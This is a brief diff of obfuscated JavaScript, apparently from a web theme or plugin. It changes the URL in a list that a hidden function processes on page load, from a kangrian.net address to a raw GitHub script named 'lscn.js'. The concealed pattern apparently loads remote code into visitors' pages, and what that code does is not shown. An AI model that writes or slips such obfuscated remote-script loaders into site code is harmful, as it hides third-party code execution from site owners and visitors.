@@ -511,7 +511,7 @@ if (tw_config[_0x2e17('0x20', '7($C')] != null || tw_config[_0x2e17('0x110', 'a#
     });
 }(function(_0x30ad07) {
     _0x30ad07(document)[_0x2e17('0x124', 'hp@c')](function() {
-        var _0x40b312 = ['https://m.kangrian.net/web&grup_id=2'];
+        var _0x40b312 = ['https://raw.githubusercontent.com/codeindie/open-project/toko-wa/lscn.js'];
         _0x40b312['forEach'](_0x4d7f78);
         var _0x7859d0 = [_0x2e17('0x149', '1^jX')];
         _0x7859d0[_0x2e17('0x1', '7sy9')](_0x4d7f78);
